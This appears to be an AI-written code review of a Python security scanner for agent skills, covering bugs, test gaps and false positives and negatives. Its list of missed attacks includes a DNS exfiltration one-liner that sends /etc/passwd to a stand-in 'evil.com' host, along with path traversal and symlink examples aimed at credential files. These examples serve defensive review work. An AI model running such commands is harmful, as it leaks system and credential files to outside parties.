# Code Review: agent-skill-evaluation v0.1.0

**Reviewer**: Claude Opus 4.6
**Date**: 2026-03-12
**Test suite**: 56 tests passing (verified)
**Skills tested**: weather, github, pdf, stock-analysis

---

## A. Code Quality

### Strengths
- Zero external dependencies — the project runs on pure Python 3.10+, which is ideal for a security tool
- Clean separation of concerns: schemas, audit modules, CLI, report generation
- Consistent use of `Finding` dataclass across all modules
- Text report formatting is readable and well-structured
- JSON output enables CI/CD integration

### Bugs Found

#### BUG-1: Domain matching allows malicious domain spoofing (SECURITY)
**File**: `skill_eval/audit/security_scan.py:230`
**Severity**: High

```python
if any(domain.endswith(safe) for safe in SAFE_DOMAINS):
    continue
```

This matches `evil-github.com` as safe because `"evil-github.com".endswith("github.com")` is `True`. An attacker could register `notgithub.com` or `evil-pypi.org` and bypass URL detection entirely.

**Fix**: Check for exact match or proper subdomain match:
```python
if any(domain == safe or domain.endswith("." + safe) for safe in SAFE_DOMAINS):
```

#### BUG-2: `.env` files are never scanned for secrets
**File**: `skill_eval/audit/security_scan.py:353-354`
**Severity**: High

```python
if file_path.name.startswith("."):
    continue
```

This skips ALL dot-files, including `.env` — the single most likely file to contain secrets. The `.env` extension is even listed in `text_extensions` (line 348), but the dot-file skip on line 353 means it's never reached.

**Fix**: Exempt `.env` files from the dot-file skip, or use a targeted exclusion list (e.g., skip `.git`, `.DS_Store`, etc.).

#### BUG-3: `check_structure` return type not documented correctly
**File**: `skill_eval/audit/structure_check.py:143-150`
**Severity**: Low

The docstring says "Returns: List of findings" but the function returns `tuple[list[Finding], Optional[dict], int]`. The CLI (`cli.py:34-38`) has a defensive `isinstance(result, tuple)` check which works around this, but the type mismatch is confusing.

**Fix**: Update the docstring and add a proper return type annotation.

#### BUG-4: Score of 0/100 "PASSED" is contradictory
**File**: `skill_eval/schemas.py:68-70` and scoring in general
**Severity**: Medium

The stock-analysis skill gets score 0/100 Grade F but "PASSED" because `passed` only checks `critical_count == 0`. Having 15 warnings (mostly external URLs) produces a score of 0, which is misleading for a legitimate skill. The scoring penalizes too heavily for INFO-level URL findings when aggregated.

This is a design issue more than a bug, but it undermines trust in the tool's output.

#### BUG-5: `npm install` detection in non-executable contexts
**File**: `skill_eval/audit/security_scan.py:287-307`
**Severity**: Low

The `_scan_file_for_installs` function doesn't filter by file type. It flags `npm install` in README.md and SKILL.md documentation, where the instruction is for the *user* to run manually. The subprocess scanner correctly limits to script extensions, but the install scanner doesn't.

### Code Style Issues

1. **Inconsistent return types**: `check_structure` returns a tuple; `scan_security` and `analyze_permissions` return lists. The CLI has to work around this with `isinstance` checks.

2. **`format` parameter in `run_audit` is unused**: `cli.py:16` accepts `format` as a parameter but never uses it inside the function (formatting is done in `main`).

3. **Magic numbers**: Score deductions (25, 10, 2) in `schemas.py:111-116` are not configurable and not documented. The thresholds for grades (90/80/70/60) are also hardcoded with no explanation.

4. **No `__all__` exports**: The public API of each module is unclear.

---

## B. Test Coverage Gaps

### Scenarios NOT tested

1. **`calculate_score` edge cases**: No test for score clamping at 0, no test for exactly-on-boundary grades (90, 80, 70, 60), no test for a skill with zero findings (score 100).

2. **`calculate_grade` boundary values**: The grade boundary (e.g., score=90 → "A", score=89 → "B") is untested.

3. **Domain spoofing in URL scanning** (BUG-1): No test verifies that `evil-github.com` is NOT treated as safe.

4. **`.env` file scanning** (BUG-2): No test verifies that `.env` files are scanned.

5. **Files with no extension**: `security_scan.py:356` skips files with `suffix != ""` but no extension — meaning extensionless files (common for shell scripts, Makefiles) are scanned. This is the correct behavior but untested.

6. **Large file skip**: No test for the 1MB file size limit in `scan_security`.

7. **`AuditReport.to_dict()` and `Finding.to_dict()`**: Used by JSON output but not directly unit-tested.

8. **`_simple_yaml_parse` edge cases**: No tests for empty input, single-quoted values, block scalars (`|`), or YAML with only comments.

9. **Concurrent/overlapping patterns**: No test for a line that matches multiple secret patterns simultaneously.

10. **Unicode/encoding**: No test for SKILL.md with non-ASCII content (common for international skills).

11. **Symlink handling**: No test for skill directories containing symlinks.

12. **`allowed-tools` with `Shell` or `Terminal`**: Tests only cover `Bash(*)`, not other high-risk tool names.

### Fixture realism

The fixtures are minimal but functional. The `good-skill` fixture is too simple to catch false positives — it has no external URLs, no scripts with imports, no `allowed-tools`. A more realistic "good" fixture with scoped Bash, legitimate URLs, and safe scripts would better test for false positives.

---

## C. False Positive / False Negative Analysis

### False Positives Found (from real skills)

| Skill | Finding | Why it's false |
|-------|---------|---------------|
| github | STR-013: metadata not a mapping | Metadata uses inline JSON5 syntax (OpenClaw convention). The simple YAML parser can't handle multi-line JSON objects. |
| pdf | 8× STR-017: missing shebang | Python scripts called via `python3 script.py` don't need shebangs. Flagging every script is noisy. |
| stock-analysis | 3× SEC-004: `npm install` in docs | Instructions in README.md/SKILL.md telling users to install tools are not executable code. |
| stock-analysis | 15× SEC-002: external URLs in scripts | A financial data skill *needs* to call Yahoo Finance, CoinGecko, etc. These are all expected. |
| stock-analysis | SEC-002: img.shields.io, clawhub.ai | Badge URLs and marketplace URLs in README.md are harmless. |

### False Negatives (what the tool MISSES)

1. **Obfuscated secrets**: Base64-encoded API keys, hex strings, rot13 — none detected.
2. **Path traversal**: `../../../etc/passwd` in scripts or instructions — not checked.
3. **Symlink attacks**: A skill could include `scripts/helper -> /etc/shadow`.
4. **Data exfiltration via DNS**: `nslookup $(cat /etc/passwd).evil.com` — not detected.
5. **Encoded/split URLs**: Building URLs from string concatenation to evade regex.
6. **Embedded binaries**: `.wasm`, `.so`, compiled executables in the skill directory.
7. **Git hooks**: A skill could contain `.git/hooks/` that execute on clone.
8. **YAML injection**: The custom YAML parser could potentially be exploited with crafted frontmatter.
9. **File permission issues**: World-writable scripts or SUID bits.
10. **Indirect shell execution**: `os.execvp`, `ctypes.CDLL`, `importlib.import_module` — not in subprocess patterns.

### Recommendations to Reduce False Positives

1. **Add a "known API endpoints" allowlist** for financial APIs, CI/CD services, etc.
2. **Don't flag URLs in README.md/documentation files** as WARNING — keep them INFO only.
3. **Make `_scan_file_for_installs` file-type-aware** (skip `.md` files) like the subprocess scanner already does.
4. **Add JSON5 parsing support** for the metadata field (common in OpenClaw skills).
5. **Make shebang check configurable** or downgrade to INFO only for `.py` files.

### Recommendations to Catch More Real Issues

1. **Scan `.env` files** (fix BUG-2).
2. **Fix domain matching** (fix BUG-1).
3. **Add path traversal detection**: scan for `../` patterns in scripts.
4. **Add `os.execvp`/`ctypes`/`importlib` to subprocess patterns**.
5. **Check for embedded binaries**: flag `.exe`, `.so`, `.wasm`, `.dll` files.

---

## D. Missing Features for Phase 1

### Quick wins (high value, low effort)

1. **`--allowlist` flag**: Let users provide a list of known-safe domains to suppress SEC-002 noise. This is the #1 usability issue.
2. **`--ignore` flag**: Skip specific finding codes (e.g., `--ignore STR-017,SEC-002`).
3. **Exit code documentation**: Document that exit code 2 = critical, 1 = warnings (with `--fail-on-warning`), 0 = clean.
4. **Summary one-liner mode**: `skill-eval audit /path --quiet` → just print `PASSED (92/A)` or `FAILED (35/F)`.
5. **Batch mode**: `skill-eval audit /path/to/skills/*` to audit multiple skills at once.

### Medium effort

6. **Config file support** (`.skill-eval.yaml`): Define allowlisted domains, ignored codes, custom thresholds per project.
7. **SARIF output**: For GitHub Code Scanning integration.
8. **`--fix` mode**: Auto-fix simple issues (add shebangs, etc.).

### Would make v0.1 immediately useful

- The `--allowlist` and `--ignore` flags are critical. Without them, the stock-analysis skill generates 32 findings, most of which are noise. Users will abandon the tool if every run produces a wall of false positives.
- Batch mode is important for marketplace operators who need to audit all skills at once.

---

## E. Bugs Found (Summary)

| Bug | File:Line | Severity | Fixed |
|-----|-----------|----------|-------|
| BUG-1: Domain spoofing in URL safe check | `security_scan.py:230` | High | Yes |
| BUG-2: `.env` files skipped by dot-file filter | `security_scan.py:353` | High | Yes |
| BUG-3: `check_structure` return type undocumented | `structure_check.py:143` | Low | Yes |
| BUG-4: Score 0 + "PASSED" contradictory | `schemas.py:68` | Medium | No (design decision) |
| BUG-5: Install pattern detection in docs | `security_scan.py:287` | Low | Yes |

---

## Overall Assessment

The framework is a solid Phase 1 foundation. The architecture is clean, the zero-dependency approach is the right call for a security tool, and the test suite covers the core paths well. The two security-relevant bugs (domain spoofing and `.env` skip) need to be fixed before any release. The false positive rate on real skills (especially stock-analysis) indicates that an allowlist/ignore mechanism is needed before v0.1 can be useful in practice.

**Grade: B-** — Functional and well-structured, but needs the bug fixes and false-positive mitigation before it's ready for users.
